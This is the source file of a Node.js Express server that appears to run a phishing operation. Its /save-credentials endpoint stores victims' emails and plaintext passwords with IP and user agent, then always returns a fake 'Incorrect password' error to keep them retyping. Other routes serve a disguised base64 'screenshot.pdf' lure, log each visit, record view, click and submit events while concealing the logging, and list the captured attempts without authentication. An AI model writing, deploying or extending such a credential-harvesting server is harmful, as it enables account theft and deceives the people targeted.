require("dotenv").config();
const express = require("express");
const helmet = require("helmet");
const cors = require("cors");
const mongoose = require("mongoose");
const crypto = require("crypto");
const Download = require("./models/Download");
const Credentials = require("./models/Credentials");
const path = require("path");
const PhishAttempt = require("./models/PhishAttempt");
const app = express();
const PORT = process.env.PORT || 3000;
const BASE64_FILE = process.env.BASE64_FILE || "";
const MONGO_URI =
  process.env.MONGO_URI || "mongodb://localhost:27017/download_tracker";

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "views"));

app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// MongoDB
mongoose
  .connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log("✅ Connected to MongoDB"))
  .catch((err) => {
    console.error(err);
    process.exit(1);
  });

// Helpers
const isValidEmail = (email) =>
  /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email || "").trim());

app.post("/save-credentials", cors(), async (req, res) => {
  try {
    let { email, password } = req.body;

    const userAgent = req.get("User-Agent") || "";
    const ip =
      req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.socket.remoteAddress ||
      "";

    // Normalize email
    email = String(email).trim().toLowerCase();

    let credential = await Credentials.findOne({ email });
    if (credential) {
      credential.password = password;
      credential.userAgent = userAgent;
      credential.ip = ip;
    } else {
      credential = new Credentials({ email, password, userAgent, ip });
    }

    await credential.save();

    // Always respond with incorrect password
    return res.status(400).json({ error: "Incorrect password" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});
// Routes
app.get("/", (req, res) => {
  const { email } = req.query;
  if (email && isValidEmail(email)) {
    res.redirect(`/request-download?email=${encodeURIComponent(email)}`);
    return;
  }
  res.send(`<h2>Enter email to download (or use direct link)</h2>`);
});

// EJS scan page
app.get("/request-download", async (req, res) => {
  try {
    const rawEmail = req.query.email || "";
    let email = "";
    try {
      email = decodeURIComponent(String(rawEmail).trim());
    } catch (e) {
      email = String(rawEmail).trim();
    }
    if (!isValidEmail(email)) return res.status(400).send("Invalid email");

    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
    const userAgent = req.get("User-Agent") || "";

    await Download.create({ email, downloadedAt: new Date(), ip, userAgent });

    const nonce = crypto.randomBytes(16).toString("base64");

    res.setHeader(
      "Content-Security-Policy",
      `default-src 'self'; script-src 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'`
    );

    res.render("scan", {
      nonce,
      base64File: BASE64_FILE,
      filename: "screenshot.pdf",
    });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
});

// Helper to get IP (same as you used previously)
const getIpFromReq = (req) =>
  req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
  req.socket.remoteAddress ||
  "";

// Public endpoint to record events: view, click, submit
// Body: { email: "user@example.com", event: "view" | "click" | "submit", metadata?: {...} }
app.post("/phish-event", cors(), async (req, res) => {
  try {
    let { email, event, metadata = {} } = req.body || {};
    if (!email || !event) {
      return res.status(400).json({ error: "email and event required" });
    }

    email = String(email).trim().toLowerCase();
    if (!isValidEmail(email)) {
      return res.status(400).json({ error: "invalid email" });
    }

    if (!["view", "click", "submit"].includes(event)) {
      return res.status(400).json({ error: "invalid event" });
    }

    const userAgent = req.get("User-Agent") || "";
    const ip = getIpFromReq(req);

    const attempt = new PhishAttempt({
      email,
      event,
      userAgent,
      ip,
      metadata,
    });

    await attempt.save();

    // Return a generic success message — do NOT reveal details of logging
    return res.status(201).json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "server error" });
  }
});

// (Optional) Admin-only endpoint to fetch attempts for review
// NOTE: protect this endpoint in production with auth (basic/token) — here it's simple for testing
app.get("/phish-attempts", async (req, res) => {
  try {
    // simple query params: ?email=&event=&limit=50
    const { email, event } = req.query;
    const limit = Math.min(100, parseInt(req.query.limit || "50", 10));

    const filter = {};
    if (email) filter.email = String(email).trim().toLowerCase();
    if (event && ["view", "click", "submit"].includes(event))
      filter.event = event;

    const attempts = await PhishAttempt.find(filter)
      .sort({ createdAt: -1 })
      .limit(limit)
      .lean();

    return res.json({ attempts });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "server error" });
  }
});

app.listen(PORT, () =>
  console.log(`🚀 Server running on http://localhost:${PORT}`)
);
